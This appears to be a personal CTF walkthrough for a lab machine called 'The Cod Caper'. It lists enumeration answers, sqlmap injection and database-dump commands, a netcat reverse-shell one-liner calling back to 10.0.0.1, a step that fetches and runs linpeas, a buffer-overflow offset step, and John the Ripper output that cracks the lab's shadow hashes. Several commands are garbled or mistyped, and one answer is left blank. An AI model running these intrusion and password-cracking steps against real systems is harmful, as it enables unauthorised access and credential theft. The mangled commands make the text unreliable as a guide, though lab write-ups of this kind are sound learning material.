# Machine NAME : The Cod Caper
# Machine IP : 10.10.110.116

***TASK 1 : Intro***

***TASK 2 : Host Enumeration***
```
1. How many ports are open on the target machine? 
: 2 

2. What is the http-title of the web server? 
: Apache2 Ubuntu Default Page: It works 

3. What version is the ssh service? 
: OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 

4. What is the version of the web server? 
: Apache/2.4.18 
```

***TASK 3: Web Enumeration***
```
1. What is the name of the important file on the server?
: /administrator.php 
```
***TASK 4: Web Exploitation***
```
1.sqlmap -u {IP} --data "username=&password="  --form 

2.sqlmap -u {IP} --data "username=&password=" --data 'username=&password='-a  
 2.1 do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
 2.2. do you want to perform a dictionary-based attack against retrieved password hashes? [Y/n/q] y
 2.3. what dictionary do you want to use : 1
   [1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
   [2] custom dictionary file
   [3] file with list of dictionary files
   2.4. do you want to use common password suffixes? (slow!) [y/N] N

3.sqlmap -u http://{IP}/administrator.php --data 'username=&password=' --dbs

4.sqlmap -u http://10.10.223.60/administrator.php --data "username=&password=" -D users --tables

5.sqlmap -u http://10.10.223.60/administrator.php --data "username=&password=" -D users -T users --dump

1.What is the admin username? 
: pingudad
2.What is the admin password? 
: secretpass
3.How many forms of SQLI is the form vulnerable to? 
: 3
```

***TASK 5: Command Execution***
```
1.How many files are in the current directory? 
: 3

2.Do I still have an account 
: yes

3 What is my ssh password? :pinguapingu
 3.1 reverse shell command
   - Listen Command : nc -lvnp 4444
   - reverse shell connect command : rm /tmp/fmkfifo /tmp/fcat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
   - I thinked for find ssh password
   - 1st See that log file ...if the "/var" directory?
   - ssh password is
```

***TASK 6: LinEnum***
```
1. What is the interesting path of the interesting suid file? 
: /opt/secret/root
- python3 -m http.server 780
- wget http://{IP}/linpeas.sh
- ./linpeas.sh 
```
***TASK 7: pwndbg*** <br>
***TASK 8: Binary-Exploitation : Manually*** <br>
***TASK 9: Binary-Exploitation : The pwntools way*** <br>
```
1. cyclic 50
2. echo "cyclic 50" | ./root2
3. check the hex value : dmesg
4. python2 ./cylic -l bytes
```
***Task 10: Finishing the job*** 
```
1.papa crack passwd file using john the ripper
 #john --wordlist=/usr/share/wordlists/rockyou.txt shadow
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Press 'q' or Ctrl-C to abort, almost any other key for status
***postman          (papa)***
1g 0:00:00:00 DONE (2020-05-27 17:22) 1.886g/s 40754p/s 40754c/s 40754C/s spices..playball
Use the "--show" option to display all of the cracked passwords reliably
Session completed

2.root crack passwd file using john the ripper
#john --wordlist=/usr/share/wordlists/rockyou.txt shadow                                                     
Warning: only loading hashes of type "sha512crypt", but also saw type "md5crypt"
Use the "--format=md5crypt" option to force loading hashes of that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:07 0.04% (ETA: 23:00:56) 0g/s 872.7p/s 872.7c/s 872.7C/s horoscope..crazy8
0g 0:00:01:50 0.46% (ETA: 00:09:43) 0g/s 724.4p/s 724.4c/s 724.4C/s alex55..Bulldog
0g 0:00:01:51 0.47% (ETA: 00:09:03) 0g/s 725.6p/s 725.6c/s 725.6C/s vivita..tazzman
***love2fish        (root)***
1g 0:00:04:57 DONE (2020-05-27 17:39) 0.003366g/s 807.5p/s 807.5c/s 807.5C/s lovelife07..lossims
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

